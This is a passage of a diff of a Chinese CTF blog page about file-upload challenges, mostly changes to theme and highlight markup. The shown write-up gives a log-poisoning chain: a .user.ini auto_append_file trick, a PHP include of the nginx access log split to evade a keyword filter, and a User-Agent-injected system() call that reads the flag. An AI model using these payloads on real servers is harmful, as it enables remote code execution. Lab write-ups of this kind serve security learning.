Safari/537.36&quot;</span><br><span class="hljs-meta"><span class="hljs-keyword">$http</span>_cookie	用户cookie信息  &quot;grafana_session=73d13d456cb4363f8a48f5501348669e&quot;</span><br><span class="hljs-meta"><span class="hljs-keyword">$ssl</span>_protocol  SSL协议版本 TLSv1</span><br><span class="hljs-meta"><span class="hljs-keyword">$ssl</span>_cipher    交换数据中的算法    RC4-SHA</span><br><span class="hljs-meta"><span class="hljs-keyword">$upstream</span>_addr 后台upstream的地址，即真正提供服务的主机地址  &quot;10.1.7.33:8102&quot;</span><br><span class="hljs-meta"><span class="hljs-keyword">$request</span>_time  整个请求的总时间    0.012</span><br><span class="hljs-meta"><span class="hljs-keyword">$upstream</span>_response_time    请求过程中，upstream响应时间  0.012</span><br></code></pre></td></tr></table></figure>
+<p>例如 <img src="/../images/image-20240912161927942.png" alt="image-20240912161927942"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$remote_addr   客户端地址   172.17.0.1</span><br><span class="line">$remote_user   客户端用户名称 --</span><br><span class="line">$time_local    访问时间和时区 [29/Dec/2022:10:17:14 +0000]</span><br><span class="line">$request   请求的URI和HTTP协议   &quot;GET /test/nginx/proxy HTTP/1.1&quot;</span><br><span class="line">$http_host 请求地址，即浏览器中你输入的地址（IP或域名） 10.1.7.33</span><br><span class="line">$status    HTTP请求状态    200</span><br><span class="line">$upstream_status   upstream状态  200</span><br><span class="line">$body_bytes_sent   发送给客户端文件内容大小    38</span><br><span class="line">$http_referer  url跳转来源 - </span><br><span class="line">$http_user_agent   用户终端浏览器等信息  &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span><br><span class="line">$http_cookie	用户cookie信息  &quot;grafana_session=73d13d456cb4363f8a48f5501348669e&quot;</span><br><span class="line">$ssl_protocol  SSL协议版本 TLSv1</span><br><span class="line">$ssl_cipher    交换数据中的算法    RC4-SHA</span><br><span class="line">$upstream_addr 后台upstream的地址，即真正提供服务的主机地址  &quot;10.1.7.33:8102&quot;</span><br><span class="line">$request_time  整个请求的总时间    0.012</span><br><span class="line">$upstream_response_time    请求过程中，upstream响应时间  0.012</span><br></pre></td></tr></table></figure>
 
 <p>所以当我们再访问是会执行php代码</p>
 <p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45588247/article/details/119401092">https://blog.csdn.net/weixin_45588247/article/details/119401092</a></p>
 <p>利用日志文件包含</p>
 <p>还是先上传.user.ini 写入auto_append_file&#x3D;1.png</p>
 <p>然后在1.png中写入图片马  这里因为log被过滤了  可以用拼接绕过</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?=</span><span class="hljs-keyword">include</span><span class="hljs-string">&quot;/var/lo&quot;</span>.<span class="hljs-string">&quot;g/nginx/access.lo&quot;</span>.<span class="hljs-string">&quot;g&quot;</span><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>然后我们抓包修改ua数据写入php代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;tac../f*&quot;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;tac../f*&quot;);?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>最后访问&#x2F;upload目录即可</p>
 <h3 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h3><p>这里加上了对文件头的检测 就是通过<strong>getimagesize():</strong> 会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求</p>
@@ -337,343 +261,90 @@
 <p>session文件包含</p>
 <p>开启session.upload_progress后  我们往服务器中上传文件时会将传输文件的相关信息保存在session中</p>
 <h3 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h3>
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-  
-</div>
-
-
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>ctf-web文件上传</div>
-      <div>http://example.com/2024/09/01/web-文件上传/</div>
     </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>作者</div>
-          <div>Gizz</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2024年9月1日</div>
-        </div>
-      
-      
-      
-        <div class="license-meta-item">
-          <div>许可协议</div>
-          <div>
-            
-              
-              
-                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                    <i class="iconfont icon-cc-by"></i>
-                  </span>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/09/01/ctf-web-sql%E6%B3%A8%E5%85%A5/" rel="prev" title="ctf-web sql注入">
+                  <i class="fa fa-angle-left"></i> ctf-web sql注入
                 </a>
-              
-            
-          </div>
-        </div>
-      
-    </div>
-    <div class="license-icon iconfont"></div>
-  </div>
-
-
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2024/09/01/ctf-web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="ctf-web文件上传">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">ctf-web文件上传</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2024/09/01/ctf-web-sql%E6%B3%A8%E5%85%A5/" title="ctf-web sql注入">
-                        <span class="hidden-mobile">ctf-web sql注入</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
             </div>
-
-            
-          </article>
-        </div>
-      </div>
-    </div>
-
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header">
-    <i class="iconfont icon-list"></i>
-    <span>目录</span>
-  </p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
-    </div>
-  </div>
+            <div class="post-nav-item">
+                <a href="/2024/09/01/ctf-web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="next" title="ctf-web文件上传">
+                  ctf-web文件上传 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
 </div>
 
 
 
 
 
-  
 
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
 </div>
-
-    
-
-    
   </main>
 
-  <footer>
+  <footer class="footer">
     <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
-    </div>
-  
-  
-  
-</div>
 
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Gizz</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/mist/" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div>
+
+    </div>
   </footer>
 
-  <!-- Scripts -->
   
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
 
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
-
-
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
 
 
   
-    <script  src="/js/img-lazyload.js" ></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
   
 
 
 
 
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
-    });
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script  src="/js/local-search.js" ></script>
-
-
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
 
 
   
 
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
+
+
+
+
 </body>
 </html>
